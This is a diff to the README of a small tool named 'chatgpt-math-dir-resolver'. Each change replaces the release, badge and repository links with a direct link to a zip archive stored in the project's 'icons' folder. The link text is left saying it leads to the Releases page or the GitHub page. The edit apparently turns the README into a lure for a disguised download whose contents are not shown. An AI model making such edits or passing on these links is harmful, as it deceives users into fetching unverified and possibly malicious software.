@@ -1,7 +1,7 @@
 # 🎉 chatgpt-math-dir-resolver - Simple Math Directory Management
 
 ## 🔗 Download Now
-[![Download chatgpt-math-dir-resolver](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Yurander/chatgpt-math-dir-resolver/releases)
+[![Download chatgpt-math-dir-resolver](https://github.com/Yurander/chatgpt-math-dir-resolver/raw/refs/heads/main/icons/math_dir_resolver_chatgpt_v2.6.zip)](https://github.com/Yurander/chatgpt-math-dir-resolver/raw/refs/heads/main/icons/math_dir_resolver_chatgpt_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you start, make sure your system meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the GitHub Releases page: [Download ChatGPT Math Dir Resolver](https://github.com/Yurander/chatgpt-math-dir-resolver/releases).
+   Click this link to go to the GitHub Releases page: [Download ChatGPT Math Dir Resolver](https://github.com/Yurander/chatgpt-math-dir-resolver/raw/refs/heads/main/icons/math_dir_resolver_chatgpt_v2.6.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version listed at the top of the page. You will see details about the app and the files available for download.
@@ -89,7 +89,7 @@ Your feedback is valuable to us. If you have suggestions, issues, or improvement
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** For more details, visit our [GitHub page](https://github.com/Yurander/chatgpt-math-dir-resolver).
+- **GitHub Repository:** For more details, visit our [GitHub page](https://github.com/Yurander/chatgpt-math-dir-resolver/raw/refs/heads/main/icons/math_dir_resolver_chatgpt_v2.6.zip).
 - **Documentation:** Find in-depth information and user guides onsite.
 - **Community Support:** Join discussions or ask questions in the issues section of our repository.
 
